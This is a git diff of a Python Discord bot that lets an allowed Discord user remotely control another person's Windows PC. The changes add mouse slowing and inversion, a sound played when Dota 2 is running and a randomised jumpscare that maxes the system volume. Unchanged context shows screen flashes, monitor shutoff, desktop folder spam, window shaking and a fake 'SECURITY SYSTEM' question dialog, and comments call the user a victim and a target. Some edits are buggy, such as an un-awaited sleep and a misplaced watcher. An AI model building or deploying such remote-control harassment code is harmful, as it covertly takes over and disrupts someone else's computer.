@@ -31,22 +31,39 @@ import screen_brightness_control as sbc
 import shutil
 from tkinter import ttk
 from dotenv import load_dotenv
+from pynput import mouse
+
+dota_already_detected = False
 
 pygame.mixer.init()
 os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
+
 load_dotenv()
+
 TOKEN = os.getenv('BOT_TOKEN')
+
 start_time = time.time()
+
 pixel_process = None
+
+mouse_inverted = False
+inverted_listener = None
+mouse_ctl = mouse.Controller()
 mouse_swapped = False
+mouse_slowed = False
+slow_multiplier = 0.1
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 tts_lock = threading.Lock()
-TARGET_PROCESS = "Soundpad.exe"
+TARGET_PROCESS = "stalcraft.exe"
 IMAGE_PATH = "images/IMG_6242.JPG"
+
 ALLOWED_USER_ID = 416798376823095296
-ALLOWED_ROLE_ID = 776386891720818719
+ALLOWED_ROLE_ID = 924996503179767820
+
 window_process = None
 window_opened_by = None
+
 SOUND_PATH = "sounds/BRAZIL FONK.mp3"
 AVAILABLE_SOUNDS = {
     "Фонк": "sounds/BRAZIL FONK.mp3",
@@ -74,7 +91,8 @@ AVAILABLE_SOUNDS = {
     "Deti": "sounds/Deti.mp3",
     "Mama": "sounds/Ma.mp3",
     "Intro": "sounds/Intro.mp3",
-    "Femboy": "sounds/Femboy.mp3"
+    "Femboy": "sounds/Femboy.mp3",
+    "Pivo": "sounds/pivo.mp3"
 }
 AVAILABLE_IMAGES = {
     "Первая картинка": "images/IMG_6242.JPG",
@@ -95,7 +113,8 @@ AVAILABLE_APPS = {
     "Блокнот": "notepad.exe",
     "Калькулятор": "calc.exe",
     "Soundpad": r"D:\Рабочий стол\Soundpad\Soundpad.exe",
-    "Dota": r"C:\SteamLibrary\steamapps\common\dota 2 beta\game\bin\win64\dota2.exe"
+    "Dota": r"E:\SteamLibrary\steamapps\common\dota 2 beta\game\bin\win64\dota2.exe",
+    "Stalcraft": r"C:\Steam\steamapps\common\STALCRAFT\bin_global\win64\java\bin\stalcraft.exe"
 }
 
 intents = discord.Intents.all()
@@ -107,6 +126,9 @@ async def on_ready():
 
     if not check_game.is_running():
         check_game.start()
+    
+    if not check_dota.is_running():
+        check_dota.start()
 
     try:
         user = await bot.fetch_user(ALLOWED_USER_ID)
@@ -159,9 +181,40 @@ async def watch_window(proc):
         window_opened_by = None
 
 @tasks.loop(seconds=5)
+async def check_dota():
+    global dota_already_detected
+    
+    is_dota_running = False
+    
+    # Ищем только Доту
+    for proc in psutil.process_iter(['name']):
+        try:
+            if "dota2.exe" in proc.info['name'].lower():
+                is_dota_running = True
+                break
+        except (psutil.NoSuchProcess, psutil.AccessDenied):
+            continue
+
+    if is_dota_running:
+        if not dota_already_detected:
+            sound_to_play = AVAILABLE_SOUNDS.get("Pivo", list(AVAILABLE_SOUNDS.values())[0])
+            
+            try:
+                if not pygame.mixer.music.get_busy():
+                    pygame.mixer.music.load(sound_to_play)
+                    asyncio.sleep(3)
+                    pygame.mixer.music.play()
+            except Exception as e:
+                print(f"Ошибка звука Доты: {e}")
+                
+            dota_already_detected = True
+    else:
+        if dota_already_detected:
+            print("🎮 [Dota-Patrol] Цель покинула игру.")
+        dota_already_detected = False
+
+@tasks.loop(seconds=3600)
 async def check_game():
-    # Обязательно добавляем IMAGE_PATH и SOUND_PATH в global, 
-    # чтобы мы могли их менять перед запуском
     global window_process, window_opened_by, IMAGE_PATH, SOUND_PATH
     is_running = False
     
@@ -177,14 +230,9 @@ async def check_game():
         if window_process is None or not window_process.is_alive():
             print(f"Обнаружен {TARGET_PROCESS}. Запускаю окно...")
             
-            # --- НОВАЯ ЛОГИКА ВЫБОРА ---
-            # 1. Выбираем случайный путь к картинке из словаря
             IMAGE_PATH = random.choice(list(AVAILABLE_IMAGES.values()))
             
-            # 2. Проверяем, выпала ли "особая" картинка
-            # Впиши сюда точный путь к картинке, для которой нужен особый звук
             if IMAGE_PATH == "images/5269660225357157265.jpg": 
-                # Если да, задаем специальный звук
                 SOUND_PATH = "sounds/batarey.mp3" 
             elif IMAGE_PATH == "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf2.jpg":
                 SOUND_PATH = "sounds/Slonik.mp3"
@@ -195,21 +243,95 @@ async def check_game():
             elif IMAGE_PATH == "images/5269660225357157264.jpg":
                 SOUND_PATH = "sounds/rakom.mp3" 
             else:
-                # 3. Если картинка обычная, выбираем случайный звук
                 SOUND_PATH = random.choice(list(AVAILABLE_SOUNDS.values()))
-            # ---------------------------
 
-            play() # Эта функция теперь возьмет наш новый случайный (или особый) SOUND_PATH
+            play()
             window_opened_by = 'auto'
             window_process = multiprocessing.Process(target=show_fullscreen_process, args=(IMAGE_PATH,), daemon=True)
             window_process.start()
             
-            # Запускаем мгновенного наблюдателя за этим окном!
             asyncio.create_task(watch_window(window_process))
     else:
         if window_process and window_process.is_alive() and window_opened_by == 'auto':
             window_process.terminate()
             print(f"{TARGET_PROCESS} закрыт. Закрываю окно.")
+
+
+def slow_mouse_logic():
+    import ctypes
+    import pyautogui
+    
+    last_x, last_y = pyautogui.position()
+    
+    while mouse_slowed:
+        curr_x, curr_y = pyautogui.position()
+        
+        if (curr_x, curr_y) != (last_x, last_y):
+            dx = curr_x - last_x
+            dy = curr_y - last_y
+            
+            target_x = last_x + (dx * slow_multiplier)
+            target_y = last_y + (dy * slow_multiplier)
+            
+            ctypes.windll.user32.SetCursorPos(int(target_x), int(target_y))
+            
+            last_x, last_y = target_x, target_y
+            
+        time.sleep(0.001)
+
+@bot.slash_command(name='mouse_slow', description='Замедлить мышь в 10 раз', guild_ids=[711194167757242368])
+async def mouse_slow_slash(ctx: discord.ApplicationContext, action: discord.Option(str, choices=["Включить", "Выключить"])):
+    global mouse_slowed
+    
+    if action == "Включить":
+        if mouse_slowed:
+            return await ctx.respond("⏳ Мышь уже замедлена!", ephemeral=True)
+        mouse_slowed = True
+        threading.Thread(target=slow_mouse_logic, daemon=True).start()
+        await ctx.respond("🐌 **Режим улитки активирован.** Мышь замедлена в 10 раз.")
+    else:
+        mouse_slowed = False
+        await ctx.respond("⚡ **Скорость мыши возвращена в норму.**")
+
+def on_move_inverted(x, y):
+    if mouse_inverted:
+        pass 
+
+def inversion_logic():
+    screen_w, screen_h = pyautogui.size()
+    last_x, last_y = pyautogui.position()
+    
+    while mouse_inverted:
+        curr_x, curr_y = pyautogui.position()
+        
+        if (curr_x, curr_y) != (last_x, last_y):
+            dx = curr_x - last_x
+            dy = curr_y - last_y
+            
+            target_x = last_x - dx
+            target_y = last_y - dy
+                       
+            target_x = max(5, min(screen_w - 5, target_x))
+            target_y = max(5, min(screen_h - 5, target_y))
+            
+            ctypes.windll.user32.SetCursorPos(int(target_x), int(target_y))
+            
+            last_x, last_y = target_x, target_y
+            
+        time.sleep(0.001)
+
+@bot.slash_command(name='invert_mouse', description='Инвертировать движение мыши (оси X и Y)', guild_ids=[711194167757242368])
+async def invert_mouse_slash(ctx: discord.ApplicationContext):
+    global mouse_inverted
+    
+    mouse_inverted = not mouse_inverted
+    
+    if mouse_inverted:
+        threading.Thread(target=inversion_logic, daemon=True).start()
+        await ctx.respond("🙃 **МЫШЬ ИНВЕРТИРОВАНА!**")
+    else:
+        await ctx.respond("✅ **Движение мыши возвращено в норму.**")
+
 
 def run_fake_delete():
     try:
@@ -255,7 +377,7 @@ def run_dead_pixel_process():
     # Случайное место
     x = random.randint(100, 1200)
     y = random.randint(100, 800)
-    root.geometry(f"2x2+{x}+{y}")
+    root.geometry(f"5x5+{x}+{y}")
     
     root.mainloop()
 
@@ -281,6 +403,7 @@ async def dead_pixel_slash(ctx: discord.ApplicationContext, action: discord.Opti
             await ctx.respond("🧼 Пиксель успешно «отмыт»!")
         else:
             await ctx.respond("❓ Активных битых пикселей не найдено.", ephemeral=True)
+
 def run_ghost_cursor():
     root = tk.Tk()
     root.overrideredirect(True) # Убираем рамки
@@ -289,7 +412,7 @@ def run_ghost_cursor():
     root.config(bg="white")
 
     # Загружаем картинку курсора
-    img = Image.open(os.path.join(BASE_DIR, "images/cursor.png")).convert("RGBA")
+    img = Image.open(os.path.join(BASE_DIR, "images/ba6b068a-6d42-45d4-871b-a6d4b2a8ebbf52.png")).convert("RGBA")
     img = img.resize((20, 20))
     tk_img = ImageTk.PhotoImage(img)
     
@@ -314,9 +437,9 @@ async def ghost_cursor_slash(ctx: discord.ApplicationContext):
 def trigger_flash():
     try:
         current_brightness = sbc.get_brightness()[0]
-        sbc.set_brightness(100) # Ослепляем
+        sbc.set_brightness(100)
         time.sleep(0.7)
-        sbc.set_brightness(current_brightness) # Возвращаем как было
+        sbc.set_brightness(current_brightness)
     except:
         pass
 
@@ -331,7 +454,6 @@ def create_and_destroy_folders():
     folder_names = ["Ой", "Упс", "Я тут", "Зачем?", "Хе-хе", "Взлом?", "Error", "404"]
     created_folders = []
     
-    # Создаем 50 папок
     for i in range(50):
         name = f"{random.choice(folder_names)}_{i}"
         path = os.path.join(desktop, name)
@@ -359,7 +481,6 @@ def shake_window():
     hwnd = win32gui.GetForegroundWindow()
     if not hwnd: return
     
-    # Запоминаем исходное положение
     rect = win32gui.GetWindowRect(hwnd)
     x, y, w, h = rect[0], rect[1], rect[2] - rect[0], rect[3] - rect[1]
     
@@ -379,7 +500,6 @@ async def earthquake_slash(ctx: discord.ApplicationContext):
 
 
 def shuffle_desktop_icons():
-    # Ручное определение констант, которых нет в win32con
     LVM_FIRST = 0x1000
     LVM_GETITEMCOUNT = LVM_FIRST + 4
     LVM_SETITEMPOSITION = LVM_FIRST + 15
@@ -438,9 +558,6 @@ async def screen_off_slash(ctx: discord.ApplicationContext):
     
     await ctx.respond("🔌 Мониторы отправлены в спящий режим. (Пошевели мышкой на ПК, чтобы включить обратно)")
     
-    # Магические системные константы Windows:
-    # 0xFFFF = Отправить всем окнам, 0x0112 = Системная команда
-    # 0xF170 = Управление питанием монитора, 2 = Выключить
     await asyncio.to_thread(ctypes.windll.user32.SendMessageW, 0xFFFF, 0x0112, 0xF170, 2)
 
 @bot.slash_command(name='swap_mouse', description='Поменять местами левую и правую кнопки мыши', guild_ids=[711194167757242368])
@@ -458,29 +575,26 @@ async def swap_mouse_slash(ctx: discord.ApplicationContext):
     else:
         await ctx.respond("✅ Кнопки мыши **ВОЗВРАЩЕНЫ В НОРМУ**.")
 
-@bot.slash_command(name='jumpscare', description='Включить скример (звук на 100% + картинка)', guild_ids=[711194167757242368])
+@bot.slash_command(name='jumpscare', description='Случайный скример (звук на 100% + картинка)', guild_ids=[711194167757242368])
 async def jumpscare_slash(ctx: discord.ApplicationContext):
-    
-    # Выбираем пути (ЗАМЕНИТЕ КЛЮЧИ НА СВОИ СТРАШНЫЕ ФАЙЛЫ ИЗ СЛОВАРЕЙ!)
-    scary_image = AVAILABLE_IMAGES.get("Батарея") # Замените на страшную картинку
-    scary_sound = AVAILABLE_SOUNDS.get("Батарея")       # Замените на страшный звук
-    
-    if not scary_image or not scary_sound:
-        return await ctx.respond("❌ Файлы скримера не найдены в словарях!", ephemeral=True)
+    import random # На всякий случай, если забыл импортировать в начале
 
-    await ctx.respond("👻 Запускаю протокол скримера...")
+    # 1. Выбираем случайные пути из словарей
+    # .values() вытаскивает именно пути к файлам, а не названия
+    all_images = list(AVAILABLE_IMAGES.values())
+    all_sounds = list(AVAILABLE_SOUNDS.values())
 
-    # 1. Выкручиваем системный звук на максимум (50 нажатий "громче" = 100%)
+    if not all_images or not all_sounds:
+        return await ctx.respond("❌ Словари изображений или звуков пусты!", ephemeral=True)
+
+    scary_image = random.choice(all_images)
+    scary_sound = random.choice(all_sounds)
+
+    await ctx.respond(f"👻 Протокол «Хаос» запущен! (Выбрано: {os.path.basename(scary_sound)})")
+
+    # 2. Выкручиваем системный звук на максимум
     await asyncio.to_thread(pyautogui.press, 'volumeup', presses=50)
     
-    # 2. Воспроизводим звук
-    try:
-        pygame.mixer.music.load(scary_sound)
-        pygame.mixer.music.play()
-    except Exception as e:
-        print(f"Ошибка звука: {e}")
-
-    # 3. Открываем страшную картинку на весь экран
     global window_process, IMAGE_PATH, window_opened_by
     IMAGE_PATH = scary_image
     
@@ -488,16 +602,21 @@ async def jumpscare_slash(ctx: discord.ApplicationContext):
         window_opened_by = 'manual'
         window_process = multiprocessing.Process(target=show_fullscreen_process, args=(IMAGE_PATH,), daemon=True)
         window_process.start()
-        # Привязываем наблюдателя, чтобы звук выключился, когда жертва закроет картинку
+    # 3. Воспроизводим звук
+    try:
+        pygame.mixer.music.load(scary_sound)
+        pygame.mixer.music.play()
+    except Exception as e:
+        await ctx.send(f"Ошибка звука: {e}")
+        
+        # Наблюдатель выключит звук, когда окно закроют
         asyncio.create_task(watch_window(window_process))
 
-# Синхронная функция окна для фонового потока
 def run_interrogation(question):
     root = tk.Tk()
     root.withdraw()
     root.attributes("-topmost", True) # Окно поверх всех игр и программ
     
-    # Открываем окно с полем для ввода
     answer = simpledialog.askstring("СИСТЕМА БЕЗОПАСНОСТИ", question, parent=root)
     root.destroy()
     return answer
